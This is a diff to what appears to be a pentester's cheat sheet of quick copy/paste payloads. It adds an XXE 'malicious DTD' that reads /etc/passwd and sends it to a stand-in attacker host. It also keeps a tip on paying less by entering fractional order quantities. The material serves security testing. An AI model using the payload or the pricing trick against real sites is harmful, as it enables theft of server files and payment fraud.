@@ -1,6 +1,10 @@
 Not a complete list by any means, but when you're manually testing and walking through sites and need a quick copy/paste, this can come in handy...
 https://github.com/1N3/IntruderPayloads
 
+malicious DTD:
+<!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> %eval; %exfiltrate;
+
+
 Testing payment flow:
 Change the order quantity to 0.6 or 0.2 you may be able to pay significantly less for an item: https://hackerone.com/reports/403783
 ============================================================
